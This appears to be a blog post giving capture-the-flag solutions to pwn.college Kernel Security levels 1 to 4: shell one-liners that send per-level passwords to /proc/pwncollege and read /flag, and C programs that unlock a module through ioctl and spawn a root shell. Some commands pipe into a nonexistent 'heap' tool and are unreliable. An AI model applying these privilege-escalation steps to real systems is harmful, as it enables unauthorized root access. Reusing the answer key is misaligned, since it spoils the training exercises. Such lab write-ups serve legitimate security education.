---
title: pwn.college Kernel Security
date: 2024-07-15 15:44:34
tags: [pwn.college, Kernel]
categories: 
    - pwn.college
    - Kernel Security
---

# level1.0
```Shell
echo pwvrvqitxoodqbxa > /proc/pwncollege | heap /proc/pwncollege
```

# level1.1
```Shell
echo ufyqfbjmxahuzqzi > /proc/pwncollege | heap /proc/pwncollege
```

# level2.0
```Shell
echo clxyrfcckjpuexis > /proc/pwncollege | dmesg
```

# level2.1
```Shell
echo ccvqignnvespgtyp > /proc/pwncollege | dmesg
```

# level3.0
```Shell
echo xpmylzhkfevejscw > /proc/pwncollege | cat /flag
```

# level3.1
```Shell
echo gwcifabytyzfdpjo > /proc/pwncollege | cat /flag
```

# level4.0
```C
#include <stdio.h>
#include <fcntl.h>

int main() {
    int fd=open("/proc/pwncollege",O_RDWR);
    ioctl(fd,1337,"emrbpgldsrexybrh");
    system("/bin/sh");
    return 0;
}
```

# level4.1
```C
#include <stdio.h>
#include <fcntl.h>

int main() {
    int fd=open("/proc/pwncollege",O_RDWR);
    ioctl(fd,1337,"gixhsazzowbivqrw");
    system("/bin/sh");
    return 0;
}
```